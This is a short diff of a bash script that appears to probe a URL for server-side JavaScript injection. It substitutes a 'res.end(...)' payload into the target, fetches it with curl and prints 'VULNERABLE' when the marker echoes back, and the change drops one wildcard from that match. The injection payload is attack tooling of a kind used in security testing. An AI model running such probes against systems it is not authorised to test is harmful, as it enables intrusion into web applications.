@@ -7,7 +7,7 @@ if [[ $2 == "check" ]]; then
 	payload=$(echo 'res.end(%22'$text'%22)')
 	target=$(echo $1 | sed "s/SSJI/$payload/g")
 	result=$(curl -si $target)
-	if [[ $result == *$text* ]]; then
+	if [[ $result == *$text ]]; then
 		echo -e "RESULT:\t\tVULNERABLE! :)\n"
 	else
 		echo -e "RESULT:\t\tNo vulnerable :(\n"
